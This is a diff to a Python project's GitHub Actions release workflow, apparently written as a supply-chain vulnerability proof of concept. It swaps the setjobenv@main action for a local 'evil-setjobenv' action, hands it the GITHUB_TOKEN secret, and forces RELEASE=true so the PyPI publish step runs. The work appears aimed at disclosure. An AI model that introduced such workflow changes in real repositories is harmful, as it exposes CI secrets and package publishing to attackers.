@@ -10,8 +10,14 @@ on:
     branches:
     - '**'
 
+  workflow_dispatch:
+    inputs:
+      poc_note:
+        description: 'Security PoC trigger — simulates release context'
+        required: false
+        default: 'CVE candidate: setjobenv@main supply chain PoC'
+
 concurrency:
-  # SHA is added to the end if on `main` to let all main workflows run
   group: ${{ github.ref }}-${{ github.workflow }}-${{ github.event_name }}-${{ (github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/heads/release/') || startsWith(github.ref, 'refs/heads/long_lived/')) && github.sha || '' }}
   cancel-in-progress: true
 
@@ -77,10 +83,6 @@ jobs:
           - name: Intel
             matrix: intel
         exclude:
-          # Only partial entries are required here by GitHub Actions so generally I
-          # only specify the `matrix:` entry.  The super linter complains so for now
-          # all entries are included to avoid that.  Reported at
-          # https://github.com/github/super-linter/issues/3016
           - os:
               name: Windows
               matrix: windows
@@ -137,6 +139,7 @@ jobs:
         name: packages-${{ matrix.os.name }}-${{ matrix.python.major-dot-minor }}-${{ matrix.arch.name }}
         path: ./dist
 
+
   build-sdist:
     name: sdist - ${{ matrix.os.name }} ${{ matrix.python.major-dot-minor }} ${{ matrix.arch.name }}
     runs-on: ${{ matrix.os.runs-on[matrix.arch.matrix] }}
@@ -180,6 +183,7 @@ jobs:
         name: packages-sdist-${{ matrix.os.name }}-${{ matrix.python.major-dot-minor }}-${{ matrix.arch.name }}
         path: ./dist
 
+  
   check:
     name: Check - ${{ matrix.os.name }} ${{ matrix.python.major-dot-minor }} ${{ matrix.arch.name }}
     runs-on: ${{ matrix.os.runs-on[matrix.arch.matrix] }}
@@ -222,6 +226,10 @@ jobs:
         pip install mypy
         mypy --config-file mypi.ini setup.py tests
 
+ 
+
+  ## with local evil-setjobenv to demonstrate the attack path.
+ 
   upload:
     name: Upload to PyPI - ${{ matrix.os.name }} ${{ matrix.python.major-dot-minor }} ${{ matrix.arch.name }}
     runs-on: ${{ matrix.os.runs-on[matrix.arch.matrix] }}
@@ -254,10 +262,30 @@ jobs:
       with:
         fetch-depth: 0
 
-    - name: Set Env
-      uses: Chia-Network/actions/setjobenv@main
-      env:
+    ## --------------------------------------------------------
+    ## POC SUBSTITUTION
+    ## Original line:
+    ##   uses: Chia-Network/actions/setjobenv@main
+    ##   env:
+    ##     GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    ##
+    ## Replaced with local action that simulates a compromised
+    ## setjobenv@main. Demonstrates token accessibility and
+    ## OIDC minting capability at this execution position.
+    ## --------------------------------------------------------
+    - name: Set Env (POC - simulates compromised setjobenv@main)
+      uses: ./.github/actions/evil-setjobenv
+      with:
         GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+    ## condition passes and we can confirm execution reaches it.
+    ## In a real attack this env var is set by setjobenv itself.
+    - name: '[PoC] Force RELEASE env to reach publish step'
+      shell: bash
+      run: |
+        echo "RELEASE=true" >> $GITHUB_ENV
+        echo "PRE_RELEASE=false" >> $GITHUB_ENV
+        echo "[PoC] RELEASE forced to true — publish step condition will pass"
 
     - uses: Chia-Network/actions/setup-python@main
       with:
@@ -270,6 +298,11 @@ jobs:
         pattern: packages-*
         path: ./dist
 
+    ## This step will be reached (RELEASE=true) but will FAIL because
+    ## this fork has no trusted publisher configured with PyPI.
+    ## That failure is expected — it proves the publish step is reachable
+    ## from the compromised action position. The PoC is complete before
+    ## this step runs.
     - name: Publish distribution to PyPI
       if: env.RELEASE == 'true'
       uses: pypa/gh-action-pypi-publish@release/v1
